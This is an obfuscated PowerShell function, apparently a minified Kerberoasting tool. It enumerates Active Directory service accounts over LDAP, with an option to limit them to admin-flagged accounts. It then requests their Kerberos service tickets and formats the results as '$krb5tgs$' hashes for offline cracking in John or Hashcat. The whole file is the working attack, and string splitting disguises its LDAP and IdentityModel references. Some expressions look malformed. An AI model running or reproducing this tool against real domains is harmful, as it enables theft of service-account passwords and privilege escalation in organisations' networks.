function I-K {
    Param(
        [String[]]$I,
        [Switch]$A,
        [String]$D,
        [String]$F,
        [String]$S,
        [String]$P='Subtree',
        [Int]$R=200,
        [Management.Automation.PSCredential]$C=[Management.Automation.PSCredential]::Empty,
        [String]$O='John'
    )
    $Null=[Reflection.Assembly]::LoadWithPartialName('System.'+'Identity'+'Model')
    $L='L'+'DAP://'
    $Q=if($D){$D}else{([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name}
    $B=if($C-eq[Management.Automation.PSCredential]::Empty){([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name}else{([System.DirectoryServices.ActiveDirectory.DirectoryContext]::new('Domain',$Q,$C.UserName,$C.GetNetworkCredential().Password)).Name}
    $T=if($B){$L+$B+'/'+if($D){"DC=$($D.Replace('.',',DC='))"}else{$Null}}else{$L+"DC=$($Q.Replace('.',',DC='))"}
    $E=if($C-eq[Management.Automation.PSCredential]::Empty){[ADSI]$T}else{[DirectoryServices.DirectoryEntry]::new($T,$C.UserName,$C.GetNetworkCredential().Password)}
    $X=[System.DirectoryServices.DirectorySearcher]$E
    $X.PageSize=$R
    $X.SearchScope=$P
    $X.CacheResults=$False
    $G=''
    $I|?{$_}|%{$N=$_;if($N-match'^S-1-.*'){$G+="(objectsid=$N)"}elseif($N-match'^CN=.*'){$G+="(distinguishedname=$N)"}else{try{$Null=[System.Guid]::Parse($N);$G+="(objectguid=$N)"}catch{$G+="(samAccountName=$N)"}}}
    $H="(&(samAccountType=805306368)(servicePrincipalName=*)"+$(if($G){"(|$G)"})+(if($A){"(admincount=1)"})+(if($F){$F})+")"
    $X.filter=$H
    $X.FindAll()|?{$_}|%{
        $U=New-Object PSObject
        $Z=$_.Properties
        $Z.PropertyNames|%{
            $K=$_;$V=$Z[$K]
            if($K-in('objectsid','sidhistory')){$U|Add-Member Noteproperty $K ([Security.Principal.SecurityIdentifier]::new($V[0],0)).Value}
            elseif($K-eq'objectguid'){$U|Add-Member Noteproperty $K ([Guid]::new(,$V[0])).Guid}
            elseif($K-eq'ntsecuritydescriptor'){$U|Add-Member Noteproperty $K ([Security.AccessControl.RawSecurityDescriptor]::new($V[0],0))}
            elseif($K-in('lastlogon','lastlogontimestamp','pwdlastset','lastlogoff','badPasswordTime')){$U|Add-Member Noteproperty $K ([datetime]::FromFileTime([Int64]$V[0]))}
            elseif($V[0]-is[System.MarshalByRefObject]){try{$M=$V[0];$H=$M.GetType().InvokeMember('HighPart','GetProperty',$Null,$M,$Null);$L=$M.GetType().InvokeMember('LowPart','GetProperty',$Null,$M,$Null);$U|Add-Member Noteproperty $K ([Int64]("0x{0:x8}{1:x8}"-f$H,$L))}catch{$U|Add-Member Noteproperty $K $V}}
            elseif($V.count-eq1){$U|Add-Member Noteproperty $K $V[0]}else{$U|Add-Member Noteproperty $K $V}
        }
        if($U.SamAccountName-notmatch'krbtgt'){
            $W=$U.ServicePrincipalName
            $J=[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($W)
            $B=$J.GetRequest()
            if($B){
                $S=[System.BitConverter]::ToString($B)-replace'-'
                $A=($S-replace'^(.*?)04820...(.*)','$2')-Split'A48201'
                $A.RemoveAt($A.Count-1)
                $M=($A-join'A48201').Insert(32,'$')
                $R=New-Object PSObject
                $R|Add-Member Noteproperty 's' $U.SamAccountName
                $R|Add-Member Noteproperty 'd' $U.distinguishedname
                $R|Add-Member Noteproperty 'sp' $W
                $R|Add-Member Noteproperty 'h' $(if($O-eq'John'){"`$krb5tgs`$unknown:$M"}else{'$krb5tgs$23$*ID#124_DN:'+$U.distinguishedname+' SPN:'+$W+'*'+$M})
                $R
            }
        }
    }
    $X.dispose()
}
